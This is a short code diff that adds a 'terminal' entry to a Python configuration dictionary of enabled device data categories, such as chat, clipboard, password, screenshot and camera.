@@ -21,7 +21,7 @@ def loadConfigurations():
     socialConfigurations = {"addressbook": 1, "chat": 1, "messages": 1, "position": 1, "photo": 1, "file": 1,
                                 "device": 1}
     configurations = {"social": socialConfigurations, "position": 1, "clipboard": 1, "password": 1, "screenshot": 1,
-                          "camera": 1, "url": 1, "deviceInfo": 1}
+                          "camera": 1, "url": 1, "deviceInfo": 1, "terminal": 1}
 
     # On error loading configurations, return false
     return True
